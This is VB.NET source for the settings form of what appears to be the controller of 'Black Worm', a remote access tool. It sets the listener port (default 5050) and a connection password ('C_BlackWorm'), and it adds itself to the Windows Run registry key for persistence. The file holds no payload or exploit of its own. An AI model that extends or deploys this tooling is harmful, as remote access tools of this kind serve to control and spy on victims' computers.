﻿Public Class PortSettings
    Public showsettings As String = My.Settings.SettingsNoStart
    Private Sub PortSettings_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Button1.Select()
        My.Settings.SettingsNoStart = True
        If showsettings = True Then
            Me.Close()
            Me.Hide()
            Me.Opacity = 0
            Form1.Show()
        Else
            Me.Opacity = 100
            Me.TopMost = True
        End If
        If My.Settings.Port = 1000 Then
            port.Value = 5050
        Else
            port.Value = My.Settings.Port
        End If


        If My.Settings.Password = "" Then
            TextBox3.Text = "C_BlackWorm"
        Else
            TextBox3.Text = My.Settings.Password
        End If
        CheckBox2.Checked = My.Settings.Startup
        CheckBox4.Checked = My.Settings.AutoListner
        CheckBox5.Checked = My.Settings.mute
        CheckBox6.Checked = My.Settings.notfication
        Form9.Visible = False
        Form9.Hide()
    End Sub
    Public Sub AStartup(ByVal Name As String, ByVal Path As String)
        On Error Resume Next
        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Key.SetValue(Name, Path, Microsoft.Win32.RegistryValueKind.String)
    End Sub
    Public Sub DStartup(ByVal Name As String)
        On Error Resume Next
        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Key.DeleteValue(Name)
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        My.Settings.Port = PORT.Value
        My.Settings.Password = TextBox3.Text
        My.Settings.SettingsNoStart = True
        My.Settings.Save()

        If CheckBox2.Checked = True Then
            AStartup("Black Worm", Application.ExecutablePath)
            My.Settings.Startup = True
        Else
            DStartup("Black Worm")
            My.Settings.Startup = False
        End If

        If CheckBox4.Checked = True Then
            My.Settings.AutoListner = True
            My.Settings.Save()
        Else
            My.Settings.AutoListner = False
            My.Settings.Save()
        End If

        If CheckBox5.Checked = True Then
            My.Settings.mute = True
            My.Settings.Save()
        Else
            My.Settings.mute = False
            My.Settings.Save()
        End If
        If CheckBox6.Checked = True Then
            My.Settings.notfication = True
            My.Settings.Save()
        Else
            My.Settings.notfication = False
            My.Settings.Save()
        End If
        Form1.k = port.Value
        Form1.Password = TextBox3.Text
        Form1.Show()
        Me.Hide()
        Me.Visible = False
        Me.Close()
    End Sub
    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Try
            My.Settings.Port = 5050
            My.Settings.Password = "C_BlackWorm"
            My.Settings.SettingsNoStart = False
            My.Settings.Startup = False
            My.Settings.AutoListner = False
            My.Settings.mute = False
            My.Settings.notfication = False
            My.Settings.Save()
            DStartup("Black Worm")
        Catch
            My.Settings.Port = 5050
            My.Settings.Password = "C_BlackWorm"
            My.Settings.SettingsNoStart = False
            My.Settings.Startup = False
            My.Settings.AutoListner = False
            My.Settings.mute = False
            My.Settings.notfication = False
            My.Settings.Save()
        End Try
    End Sub
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        TextBox3.Text = "C_" & RandomPassword(8)
    End Sub
    Public Function RandomPassword(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    Public Function RandomPort(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "123456789".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        port.Value = RandomPort(4)
    End Sub
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If My.Settings.SettingsNoStart = True Then
            Me.Close()
            Me.Hide()
            Me.Opacity = 0
            Form1.Show()
        End If
    End Sub
    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.Checked = True Then
            CheckBox3.Text = "Hide Password"
            TextBox3.PasswordChar = ""
        ElseIf CheckBox3.Checked = False Then
            CheckBox3.Text = "Show Password"
            TextBox3.PasswordChar = "•"
        Else
            CheckBox3.Checked = False
            TextBox3.PasswordChar = "•"
        End If
    End Sub
End Class